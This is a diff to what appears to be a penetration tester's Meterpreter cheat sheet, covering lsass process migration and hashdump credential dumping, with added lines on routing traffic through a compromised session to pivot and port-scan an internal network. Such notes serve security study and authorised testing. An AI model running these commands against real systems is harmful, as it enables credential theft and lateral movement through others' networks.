@@ -25,3 +25,12 @@ pid #find lsass pid
 migrate -N <processname> #migrate into process
 
 hashdump
+
+#set up route to route through existing connection and provide access to rest of network:
+background #background existing meterpreter session
+route add <network_to_access> <subnet_mask> <session>
+route add 10.0.0.1 255.255.255.0 1 #10.0.0.1/24 session 1
+#now any traffic from your (attacker) machine will go through this pivot, showing up as traffic from exploited system
+#can use aux modules such as portscanners:
+use auxiliary/scanner/portscan/tcp
+set RHOSTS <targetip-range>
